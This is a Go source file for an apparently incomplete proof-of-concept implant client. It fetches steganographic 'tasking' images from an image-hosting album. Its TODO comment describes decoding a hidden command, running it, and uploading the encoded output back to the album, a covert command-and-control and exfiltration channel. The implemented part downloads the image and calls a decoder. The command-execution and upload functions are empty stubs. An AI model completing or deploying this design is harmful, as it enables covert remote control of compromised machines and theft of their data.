package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	// Internal libs
	"github.com/AntiMatter/cmd"

	// External libs
	"github.com/fatih/color"
)

var clientOptions = map[string]string{"ClientID": "", "AlbumID": ""}

/*
TODO:
- Client needs to be configured to know what album to grab from
	- This is probably gonna be done through the description words, how can you preconfigure this??
- Once you get past the first part, it needs to be able to grab the tasking image from the album
- Decode it the command
- Run it
- Encode the result in a new image
- And upload a new image into the same album


*/

// getTasking is the client grabbing the tasking configured for it
func getTasking(albumID string, clientID string) {
	clientID = clientOptions["ClientID"]

	linkImage := cmd.GetLinkClient(albumID, clientID)

	response, e := http.Get(linkImage)
	if e != nil {
		log.Print(e)
	}
	defer response.Body.Close()

	// open a file for writing
	// Should probably have the user define what and where to call this
	file, err := os.Create("/tmp/asdf.jpg")
	if err != nil {
		log.Print(err)
	}
	defer file.Close()

	// Use io.Copy to just dump the response body to the file. This supports huge files
	_, err = io.Copy(file, response.Body)
	if err != nil {
		log.Print(err)
	}
	fmt.Println("Get response: Success!")
	fmt.Println(" ")

	fmt.Println(color.GreenString("Response") + ":")
	fmt.Println(" ")

	cmd.DecodeImage()

	fmt.Println(" ")

}

// decodeImage will decode the tasking image, and then run the command and grab the output, store it somewhere as a return value maybe?
func decodeImage() {

}

// encodeOutput will take the command output and encode it into another image (in memory?) and upload it to the configured album
func encodeOutput() {

}

func main() {

	albumID := flag.String("album-id", "", "The album ID to retrieve tasking and upload responses")

	flag.Parse()

	fmt.Println("This is the client PoC...")
	fmt.Print("Please enter the Client-ID >> ")

	reader := bufio.NewReader(os.Stdin)
	// ReadString will block until the delim is entered
	clientID, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("An error occured while reading input: ", err)
		os.Exit(1)
	}
	// Remove the delim from the string
	clientID = strings.TrimSuffix(clientID, "\n")

	clientOptions["ClientID"] = clientID

	// Check to see if the flag was set or not, if not then prompt user to enter value
	if *albumID == "" {
		fmt.Print("Please enter the AlbumID >> ")
		albumID, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("An error occured while reading input: ", err)
			os.Exit(1)
		}
		albumID = strings.TrimSuffix(albumID, "\n")

		clientOptions["AlbumID"] = albumID
	} else {
		clientOptions["AlbumID"] = *albumID
	}
	getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
}
